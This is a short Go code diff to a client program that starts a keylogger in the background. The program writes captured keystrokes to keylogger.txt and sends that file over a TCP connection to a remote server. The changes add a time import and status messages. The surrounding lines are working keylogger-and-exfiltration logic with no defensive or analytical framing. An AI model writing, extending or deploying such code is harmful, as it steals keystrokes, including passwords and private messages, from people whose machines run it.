@@ -5,6 +5,7 @@ import (
 	"io"
 	"net"
 	"os"
+	"time"
 )
 
 func StartClient() {
@@ -17,8 +18,8 @@ func StartClient() {
 	// Start the logger in the background
 	go func() {
 		// Create logs and save to a file
+		fmt.Println("Keylogger has been started.")
 		KeyLogger()
-
 		// Once the logs are created, signal that the file is ready to be sent
 		fileSent <- struct{}{}
 	}()
@@ -27,6 +28,7 @@ func StartClient() {
 	<-fileSent
 
 	// Open the file you want to send
+	fmt.Println("Trying to open generated file...")
 	file, err := os.Open("keylogger.txt")
 	if err != nil {
 		fmt.Println("Error opening file:", err)
@@ -35,6 +37,7 @@ func StartClient() {
 	defer file.Close()
 
 	// Connect to the server
+	fmt.Println("Trying to connect to the server...")
 	conn, err := net.Dial("tcp", serverAddress)
 	if err != nil {
 		fmt.Println("Error connecting to the server:", err)
@@ -44,10 +47,11 @@ func StartClient() {
 
 	// Copy the file to the network connection
 	_, err = io.Copy(conn, file)
+	fmt.Println("Trying to send file...")
 	if err != nil {
 		fmt.Println("Error sending file:", err)
 		return
 	}
 
-	fmt.Println("File sent to the server.")
+	fmt.Println("File has been sent to the server.")
 }
